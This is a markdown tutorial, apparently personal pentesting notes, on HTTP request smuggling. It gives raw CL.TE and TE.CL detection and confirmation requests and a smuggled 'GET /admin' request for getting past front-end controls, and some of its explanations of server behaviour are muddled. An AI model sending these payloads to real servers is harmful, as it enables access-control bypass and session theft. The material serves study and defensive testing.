# HTTP Request Smuggling

## 1. HTTP Request Smuggling
- A web attack where an attacker exploits differences in how front-end and back-end servers interpret HTTP requests, allowing them to “smuggle” hidden requests past security controls.

## 2. What happens in an HTTP Request Smuggling attack
- ***The attacker sends a specially crafted request that the front-end and back-end servers parse differently. This causes the back-end to process a hidden request, often leading to unauthorized actions or data theft.***
- The attacker sends one confusing request.
- Front-end server thinks:
	- “Okay, this request ends here.”
- Back-end server thinks:
	- “Wait, there’s more data after this request!”
- The extra hidden request slips through without security checks.
- The attacker can:
	- Steal someone’s session/cookies.
	- Bypass logins/firewalls.
	- Even take over the application.

## 3. How do HTTP request smuggling vulnerabilities arise?
- These vulnerabilities occur when servers in a chain (like proxies, load balancers, and back-end servers) disagree on where an HTTP request ends, usually due to conflicting **Content-Length** and **Transfer-Encoding headers**.
- HTTP/1 has two ways to say how long a request is:
	- Content-Length (tells exact size).
	- Transfer-Encoding: chunked (sends data in pieces).
- If both are used together, servers might disagree:
	- Front-end trusts one.
	- Back-end trusts the other.
- This miscommunication opens the door for attackers.

## 4. How to perform an HTTP Request Smuggling attack
- Attacker crafts a request with both headers (Content-Length + Transfer-Encoding).
- Sends it to the website.
- Front-end forwards part of it to the back-end.
- Back-end reads extra hidden data as a new request.
- Attacker’s “smuggled” request runs in the victim’s session or bypasses checks.
```bash
POST / HTTP/1.1
Host: site.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: site.com

```
-Here:
	-Front-end stops reading at 0.
	-Back-end treats GET /admin as a new request.

	

# Methodology
1. Pick an endpoint
2. Prepare Repeater for Request Smuggling
3. Detect the CL.TE Vulnerability
4. Confirm the CL.TE Vulnerability


	-	## Steps for Prepare Repeater for Request Smuggling
		1. Downgrade HTTp protocaol to HTTP/1.1
		2. Change the request method to POST
		3. Disable automatic update of Content-Length
		4. Show non-printable characters (\r\n)
		
		
	-	## Step for Detect
		- HTTP request
		```bash
		Content-Length: 6
		Transfer-Encoding: chunked
		\r\n
		3\r\n
		abc\r\n
		X\r\n
		```
		- IF Response :  
			- response(backend) -> CL.CL
			- reject(frontend) 
				- -> TE.CL
				- -> TE.TE
			- timeout(backend) -> CL.TE  
		
		
		- HTTP request
		```bash
		Content-Length: 6
		Transfer-Encoding: chunked
		\r\n
		0\r\n
		X\r\n
		```
		
		- IF Response :  
			- response(backend) 
				- -> CL.CL
				- -> TE.TE
			- timeout(backend) -> TE.CL
			- socket poison (backend) -> CL.TE

    -   ## 	Confirm
    
    	- CL.TE
		  ```bash
		  Content-Length: 6
		  Transfer-Encoding: chunked
		  \r\n
		  0\r\n
		  \r\n
		  X
		  ```

		- TE.CL
		  ```bash
		  Content-Length: 6
		  Transfer-Encoding: chunked
		  \r\n
		  1\r\n
		  X\r\n
		  0\r\n
		  \r\n
		  ```		



# 1. Checking if the front-end uses Transfer-Encoding 
```bash
POST / HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3    ← means "next chunk is 3 bytes long"
abc  ← 3 bytes of data
X

```
- 👉 What happens:
	- According to the HTTP/1.1 spec, **Transfer-Encoding** should take priority over **Content-Length**.
So the front-end trusts Transfer-Encoding.
	- It believes the body is chunked data.
	- It forwards only **abc** and treats the X differently (thinking it’s part of the next request).
	- Front-end waits for end of body **0\r\n\r\n**  But instead, you gave: **X**
	- ❌ That is not valid chunked syntax, so the front-end stops at abc and assumes that’s the complete
	- If the back-end breaks or interprets differently, you’ll notice strange responses (errors, partial data, - delays, or your “X” showing in the next request).


# 2. Checking if the back-end uses Transfer-Encoding
```bash
POST / HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc

```
- 👉 What happens:
	- Front-end: Sees Transfer-Encoding, so forwards abc.
	- Back-end: If it also uses Transfer-Encoding, it expects a terminating 0\r\n\r\n to mark end of chunks.
	- But you didn’t send it → back-end keeps waiting → timeout.
- This proves:
	- Back-end is also honoring chunked encoding.


# 3. Checking if Backend using Content-Length
```bash
POST / HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Transfer-Encoding: chunked

0

X


```
- 👉 What happens:
	- Front-end: Uses Transfer-Encoding: chunked. It sees 0\r\n\r\n → body ends there. It forwards only that.
	- Back-end: Uses Content-Length: 7. It expects 7 bytes of body. But only receives 0\r\n\r\nX (6 bytes).
	- Back-end now waits for 1 more byte → you’ll see the response hang / timeout.
- This proves:
	- Front-end trusted Transfer-Encoding.
	- Back-end trusted Content-Length.


| Parser                | How to Break It (Cause Timeout)            |
| --------------------- | ------------------------------------------ |
| **Transfer-Encoding** | Don’t send final `0\r\n\r\n`               |
| **Content-Length**    | Set `Content-Length` larger than real body |

##  Transfer-Encoding :  👉 If server hangs, it’s using Transfer-Encoding.
```bash

POST / HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

3
abc # wait for 0 to end body

```
## Content-Length : 👉 If server hangs, it’s using Content-Length.
```bash
POST / HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

xyz # only 3 char

```